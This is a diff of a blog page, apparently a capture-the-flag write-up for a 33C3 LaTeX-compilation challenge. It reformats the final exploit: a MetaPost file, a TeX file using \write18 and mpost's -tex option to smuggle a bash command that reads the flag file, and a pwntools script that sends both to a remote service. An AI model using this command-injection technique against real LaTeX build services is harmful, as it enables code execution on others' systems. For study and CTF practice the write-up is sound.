@@ -299,51 +299,50 @@ nc 78.46.224.91 24242</p>
 
 <p>Here’s our final exploit:</p>
 
-<p>```txt sss.mp
-verbatimtex
+<p>sss.mp:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>verbatimtex
 \documentclass{minimal}\begin{document}
 etex beginfig (1) label(btex blah etex, origin);
-endfig; \end{document} bye</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-```txt aaa.tex
-\documentclass{article}\begin{document}
-\immediate\write18{mpost -ini "-tex=bash -c (cat${IFS}$(ls|grep${IFS}33C3))&gt;qqq.log" "sss.mp"}
-\end{document}
+endfig; \end{document} bye
 </code></pre></div></div>
 
-<p>```python exp.py
-from pwn import *</p>
+<p>aaa.tex:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">\documentclass</span><span class="p">{</span>article<span class="p">}</span><span class="nt">\begin{document}</span>
+<span class="k">\immediate\write</span>18<span class="p">{</span>mpost -ini "-tex=bash -c (cat<span class="p">${</span><span class="nb">IFS</span><span class="p">}$</span>(ls|grep<span class="p">${</span><span class="nb">IFS</span><span class="p">}</span><span class="m">33</span><span class="nb">C</span><span class="m">3</span><span class="o">))</span><span class="nb">&gt;qqq.log" "sss.mp"</span><span class="p">}</span><span class="nb">
+</span><span class="nv">\end</span><span class="p">{</span><span class="nb">document</span><span class="p">}</span><span class="nb">
+</span></code></pre></div></div>
 
-<p>r = remote(“78.46.224.91”, 24242)</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<p>log.info(“creating sss.mp…”)
-r.sendlineafter(“&gt;”, “create mp sss”)
-r.recvline()
-f = open(“sss.mp”, “r”)
-for line in f:
-    r.sendline(line.strip())
-r.sendline(“\q”)
-f.close()</p>
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"78.46.224.91"</span><span class="p">,</span> <span class="mi">24242</span><span class="p">)</span>
 
-<p>log.info(“creating aaa.tex…”)
-r.sendlineafter(“&gt;”, “create tex aaa”)
-r.recvline()
-f = open(“aaa.tex”, “r”)
-for line in f:
-    r.sendline(line.strip())
-r.sendline(“\q”)
-f.close()</p>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"creating sss.mp..."</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"create mp sss"</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"sss.mp"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"</span><span class="err">\</span><span class="s">q"</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
-<p>r.sendlineafter(“&gt;”, “compile aaa”)
-r.sendlineafter(“&gt;”, “show log qqq”)</p>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"creating aaa.tex..."</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"create tex aaa"</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"aaa.tex"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"</span><span class="err">\</span><span class="s">q"</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
-<p>r.interactive()
-```</p>
+<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"compile aaa"</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"show log qqq"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
 
 <p><strong>Don’t take LaTEX files from strangers!!</strong></p>
 
 <p>flag: <code class="highlighter-rouge">33C3_pdflatex_1s_t0t4lly_s3cur3!</code></p>
-
 
         
       </section>
